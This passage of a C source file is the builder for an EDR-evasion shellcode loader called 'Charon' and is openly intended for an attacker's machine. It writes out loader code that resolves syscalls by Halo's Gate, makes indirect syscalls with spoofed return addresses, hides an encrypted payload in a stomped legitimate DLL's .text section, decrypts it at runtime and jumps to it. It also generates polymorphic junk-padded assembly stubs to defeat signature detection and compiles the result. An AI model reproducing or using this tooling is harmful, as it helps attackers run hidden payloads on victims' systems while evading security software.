    "\"VirtualProtectEx\"));\n"
    "    Mask_Worker.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), "
    "\"WaitForSingleObjectEx\"));\n"
    "    Mask_Memory.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), "
    "\"MapViewOfFile\"));\n"
    "    Mask_File.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), "
    "\"CreateFileW\"));\n"
    "\n"
    "    qThreadBase = "
    "SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sK32)"
    ", \"BaseThreadInitThunk\")));\n"
    "    qRtlUserThreadStart = "
    "SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA("
    "sNtdll), \"RtlUserThreadStart\")));\n"
    "    if(!qThreadBase) { printf(\"[!] Failed to resolve "
    "BaseThreadInitThunk\\n\"); return FALSE; }\n"
    "    \n"
    "    Mask_Security.dwFrameSize = CalcFrameSize(Mask_Security.pAddress);\n"
    "    Mask_Worker.dwFrameSize = CalcFrameSize(Mask_Worker.pAddress);\n"
    "    Mask_Memory.dwFrameSize = CalcFrameSize(Mask_Memory.pAddress);\n"
    "    Mask_File.dwFrameSize = CalcFrameSize(Mask_File.pAddress);\n"
    "    \n"
    "    qThreadBaseFrame = CalcFrameSize(qThreadBase);\n"
    "    qRtlUserThreadStartFrame = CalcFrameSize(qRtlUserThreadStart);\n"
    "    \n"
    // Resolve LoadLibraryExA
    "    char sLoad[] = "
    "{'L','o','a','d','L','i','b','r','a','r','y','E','x','A',0};\n"
    "    g_pLoadLibraryExA = GetProcAddress(GetModuleHandleA(sK32), sLoad);\n"
    "    if(!g_pLoadLibraryExA) { printf(\"[!] Failed to resolve "
    "LoadLibraryExA\\n\"); return FALSE; }\n"
    "    \n"
    "    // Try to find a valid gadget in kernel32 first, fallback to ntdll\n"
    "    qGadgetAddress = FindValidGadgetInModule(sK32, &qGadgetType, 0x100, "
    "&qFrameSize);\n"
    "    if (!qGadgetAddress) {\n"
    "        qGadgetAddress = FindValidGadgetInModule(sNt, &qGadgetType, "
    "0x100, &qFrameSize);\n"
    "    }\n"
    "    \n"
    "    if (!qGadgetAddress) { \n"
    "        printf(\"[!] Suitable Gadget (frame >= 0x100) not found\\n\"); \n"
    "        return FALSE; \n"
    "    }\n"
    "    \n"
    "    printf(\"[+] Found Valid Gadget at %p (Type: %d) | Frame: 0x%X\\n\", "
    "qGadgetAddress, qGadgetType, qFrameSize);\n"
    "    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType, "
    "qFrameSize);\n"
    "    \n"
    // [STEP 2] Resolve Syscalls (Halos Gate)
    // Walk global exports of ntdll.dll to find syscalls and their SSNs.
    "    for (WORD i = 0; i < pExport->NumberOfNames; i++) {\n"
    "        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);\n"
    "        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];\n"
    "        \n"
    "        USHORT prefix = *(USHORT*)pcName;\n"
    "        if (prefix != 0x744E && prefix != 0x775A) continue; // Filter for "
    "'Nt' or 'Zw'\n"
    "        \n"
    "        DWORD64 dwSsn = GetSSN(pAddress);\n"
    "        if (dwSsn == INVALID_SSN) continue;\n"
    "        \n"
    "        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);\n"
    "        if (!pSyscallRet) continue;\n"
    "        \n"
    "        // Store entry in our internal list\n"
    "        SyscallList.Entries[idx].pAddress = pAddress;\n"
    "        SyscallList.Entries[idx].dwSsn = dwSsn;\n"
    "        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;\n"
    "        SyscallList.Entries[idx].dwHash = djb2((PBYTE)pcName);\n"
    "        \n"
    "        idx++;\n"
    "        if (idx >= 512) break;\n"
    "    }\n"
    "    SyscallList.Count = idx;\n"
    "    \n"
    // Resolve SystemFunction032 for data decryption
    "    char sAdv[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};\n"
    "    g_pSystemFunction032 = "
    "GetProcAddressByHash(((fnLoadLibraryExA)g_pLoadLibraryExA)(sAdv, NULL, "
    "0), "
    "0xB1E6B89241A41B94);\n"
    "    if(!g_pSystemFunction032) printf(\"[!] Failed to resolve "
    "SystemFunction032\\n\");\n"
    "    \n"
    "    return TRUE;\n"
    "}\n"
    "\n"
    "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, "
    "PSIZE_T, ULONG, PULONG);\n"
    "\n"
    // -------------------------------------------------------------------------
    // [SECTION 5] CONFIG & PAYLOAD
    // -------------------------------------------------------------------------
    "#define KEY_SIZE 16\n"
    "unsigned char Key[16];\n"
    "unsigned char HINT_BYTE;\n"
    "DWORD UUID_COUNT;\n"
    "\n"
    "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* "
    "Key);\n"
    "typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, "
    "ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
    "\n"

    // -------------------------------------------------------------------------
    // [ENTRY POINT]
    // -------------------------------------------------------------------------
    // Uncomment main and comment WinMain to enable console mode
    // "int main() {\n"
    "   int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR "
    "lpCmdLine, int nCmdShow) {\n"
    // "    setvbuf(stdout, NULL, _IONBF, 0);\n"
    "    if (__argc < 2) { printf(\"[!] No payload file provided\\n\"); return "
    "1; }\n"
    "    char* encFile = __argv[1];\n"
    "    FILE* fEnc = fopen(encFile, \"rb\");\n"
    "    if (!fEnc) { printf(\"[!] Failed to open %s\\n\", encFile); return 1; "
    "}\n"
    "    fseek(fEnc, 0, SEEK_END);\n"
    "    long encSize = ftell(fEnc);\n"
    "    rewind(fEnc);\n"
    "    unsigned char* encBuf = (unsigned char*)malloc(encSize);\n"
    "    if (!encBuf) { printf(\"[!] Memory allocation failed\\n\"); "
    "fclose(fEnc); return 1; }\n"
    "    fread(encBuf, 1, encSize, fEnc);\n"
    "    fclose(fEnc);\n"
    "\n"
    "    HINT_BYTE = encBuf[0];\n"
    "    UUID_COUNT = *(DWORD*)(encBuf + 1);\n"
    "    memcpy(Key, encBuf + 5, 16);\n"
    "    char* pResData = (char*)(encBuf + 21);\n"
    "    SIZE_T sSize = UUID_COUNT * 16;\n"
    "    PVOID pAddr = NULL; DWORD dwOld = 0; HANDLE hProc = (HANDLE)-1;\n"
    "    \n"
    "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
    // "    printf(\"SQLite Version: %s\\n\", sqlite3_libversion());\n"
    "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return 1; }\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 1] Module Stomping Setup
    // We load a legitimate DLL (Chakra.dll) to use as a backing file for our
    // payload. This avoids 'unbacked executable memory' indicators.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Looking for a sacrificial DLL...\\n\");\n"
    "    HMODULE hSacrificial = NULL;\n"
    "    char s1[] = {'C','h','a','k','r','a','.','d','l','l',0};\n"
    "    hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s1, NULL, 0x1);\n"
    "    if (!hSacrificial) {\n"
    "        char s2[] = {'j','s','c','r','i','p','t','9','.','d','l','l',0};\n"
    "        hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s2, NULL, "
    "0x1);\n"
    "    }\n"
    "    if (!hSacrificial) {\n"
    "        char s3[] = {'M','i','a','c','r','o','m','e','.','d','l','l',0};\n"
    "        hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s3, NULL, "
    "0x1);\n"
    "    }\n"
    "    if (!hSacrificial) {\n"
    "        char s4[] = "
    "{'X','p','s','S','e','r','v','i','c','e','s','.','d','l','l',0};\n"
    "        hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s4, NULL, "
    "0x1);\n"
    "    }\n"
    "    if (!hSacrificial) { printf(\"[!] All candidates failed.\\n\"); "
    "return 1; }\n"
    "    \n"
    // Find .text section to inject into
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hSacrificial;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hSacrificial + "
    "pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n"
    "    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
    "        char* sName = (char*)pSec[i].Name;\n"
    "        if (strncmp(sName, \".text\", 5) == 0) {\n"
    "            pAddr = (PVOID)((PBYTE)hSacrificial + pSec[i].VirtualAddress "
    "+ "
    "4096);\n"
    // Safety check: Ensure payload fits in the section
    "            if (sSize + 4096 > pSec[i].Misc.VirtualSize) { printf(\"[!] "
    "Payload "
    "too big for .text\\n\"); return 1; }\n"
    "            break;\n"
    "        }\n"
    "    }\n"
    "    if (!pAddr) { printf(\"[!] .text section not found in "
    "Sacrificial DLL\\n\"); return 1; }\n"
    "    qChakraFunc = (PVOID)((ULONG_PTR)pAddr + 0x45);\n"
    "    qChakraFuncFrame = CalcFrameSize(qChakraFunc);\n"
    "    printf(\"[+] Found target memory at %p (File-Backed)\\n\", pAddr);\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 2] Preparation (RW)
    // Use Indirect Syscall (NtProtectVirtualMemory) to make the .text section
    // Writable.
    // -------------------------------------------------------------------------
    // Resolve Protect SSN index
    "    DWORD64 hProt = 0x858BCB1046FB6A37; \n"
    "    int idxProtect = -1;\n"
    "    for(int i=0; i<SyscallList.Count; i++) {\n"
    "        if(SyscallList.Entries[i].dwHash == hProt) idxProtect = i;\n"
    "    }\n"
    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase "
    "+ (idxProtect * 16));\n"
    "    \n"
    "    printf(\"[+] Changing permissions to RW...\\n\");\n"
    "    NTSTATUS status = ExecuteSyscall(fProt, Mask_Security, hProc, &pAddr, "
    "&sSize, PAGE_READWRITE, "
    "&dwOld);\n"
    "    if(status != 0) { printf(\"[!] Protect (RW) Failed: 0x%X\\n\", "
    "status); "
    "return 1; }\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 3] Payload Decryption
    // Runtime calculation of the key (KeyGuard) and RC4 decryption.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Decrypting payload into module...\\n\");\n"
    // KeyGuard: Brute-force the hint byte to derive the real key at runtime
    "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
    "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
    "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, "
    "    pAddr};\n"
    "    fnSystemFunction032 Decrypt = "
    "(fnSystemFunction032)g_pSystemFunction032;\n"
    "    \n"
    "    // Decode UUIDs to pAddr\n"
    "    for (int i = 0; i < UUID_COUNT; i++) {\n"
    "        UUIDToBytes(pResData + (i * 36), (unsigned char*)pAddr + (i * "
    "16));\n"
    "    }\n"
    "    d.Buffer = pAddr;\n"
    "    Decrypt(&d, &k);\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 4] Finalize (RX)
    // Restore permissions to Read+Execute.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Changing permissions to RX...\\n\");\n"
    "    status = ExecuteSyscall(fProt, Mask_Security, hProc, &pAddr, &sSize, "
    "PAGE_EXECUTE_READ, &dwOld);\n"
    "    if(status != 0) { printf(\"[!] Protect (RX) Failed: 0x%X\\n\", "
    "status); "
    "return 1; }\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 5] Execution
    // Use assembly tail call to wipe traces and execute payload.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Wiping stack and jumping to payload...\\n\");\n"
    "    JumpToPayload(pAddr);\n"
    "\n"
    "    printf(\"[+] Finished. Press Enter to exit.\\n\");\n"
    // "    getchar();\n"
    "    return 0;\n"
    "}\n";

// =================================================================================
//  PART 3: BUILDER LOGIC
// =================================================================================
// The following code runs on the attacker's machine to build the artifact.

int main() {
  printf("\n"
         "   _____ _    _          _____  ____  _   _ \n"
         "  / ____| |  | |   /\\   |  __ \\|  _ \\| \\ | |\n"
         " | |    | |__| |  /  \\  | |__) | | | |  \\| |\n"
         " | |    |  __  | / /\\ \\ |  _  /| | | | . ` |\n"
         " | |____| |  | |/ ____ \\| | \\ \\| |_| | |\\  |\n"
         "  \\_____|_|  |_/_/    \\_\\_|  \\_\\____/|_| \\_|\n"
         "        Artifact Builder & Obfuscator        \n"
         "\n");

  srand((unsigned int)time(NULL));

  // -----------------------------------------------------------------------
  // [BUILD STEP 1] Generate Assembly Stubs (Polymorphic)
  // Create 'syscalls.asm' with the evasion engine and 512 unique entry stubs.
  // -----------------------------------------------------------------------
  printf("[*] Generating syscalls.asm (HellHall + 512 Polymorphic Stubs)...\n");
  FILE *fAsm = fopen("syscalls.asm", "w");
  if (fAsm) {
    fputs(g_HellHallAsm, fAsm);
    // Target 512 stubs (covers all NTDLL)
    int STUB_COUNT = 512;

    for (int i = 0; i < STUB_COUNT; i++) {
      fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
      fprintf(fAsm, "    ALIGN 16\n"); // Align to 16 bytes
      fprintf(fAsm, "    Fnc%04X PROC\n", i);

      // Standard instruction
      fprintf(fAsm, "        mov eax, %d\n", i);
      fprintf(fAsm, "        jmp SyscallExec\n");

      // Random Junk / NOPs to fill remaining 6 bytes (16 - 10 = 6)
      // This breaks the block hash signature
      int padding = rand() % 3; // Choose random pattern
      if (padding == 0) {
        // 6 NOPs
        fprintf(fAsm, "        nop\n        nop\n        nop\n        nop\n    "
                      "    nop\n        nop\n");
      } else if (padding == 1) {
        // 3 byte (xchg r8,r8) + 3 byte (nop, nop, nop) = 6
        fprintf(fAsm,
                "        xchg r8, r8\n        nop\n        nop\n        nop\n");
      } else {
        // 2 byte (xchg ax,ax) + 2 byte (xchg ax,ax) + 2 byte (nop,nop) = 6
        fprintf(fAsm, "        xchg ax, ax\n        xchg ax, ax\n        nop\n "
                      "       nop\n");
      }

      fprintf(fAsm, "    Fnc%04X ENDP\n\n", i);
    }
    fprintf(fAsm, "end\n");
    fclose(fAsm);
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 2] Assemble & Compile
  // Invoke ML64 and CL to build the final artifact.
  // -----------------------------------------------------------------------
  printf("[*] Assembling (ML64)...\n");
  if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
    printf("[!] Assembly Failed.\n");
    return EXIT_FAILURE;
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 3] Generate C Source
  // Write artifact.c
  // -----------------------------------------------------------------------
  printf("[*] Generating artifact.c...\n");
  FILE *fC = fopen("artifact.c", "w");
  if (fC) {
    fputs(g_StubTemplate, fC);
    fclose(fC);
  }

  // -----------------------------------------------------------------------
  // [BUILD STEP 4] Compile
  // Compile the artifact C code and link it with the assembly object.
  // -----------------------------------------------------------------------
  printf("[*] Compiling Artifact (CL)...\n");
  int res =
      system("cl /nologo /O2 artifact.c syscalls.obj "
             // "sqlite-amalgamation-3510200\\sqlite3.c "
             "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");

  // -----------------------------------------------------------------------
  // [BUILD STEP 5] Cleanup
  // Remove temporary build files.
  // -----------------------------------------------------------------------
  system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");

  if (res == 0) {
    printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
    return EXIT_SUCCESS;
  } else {
    printf("\n[!] FAILURE: Compilation error.\n");
    return EXIT_FAILURE;
  }
}
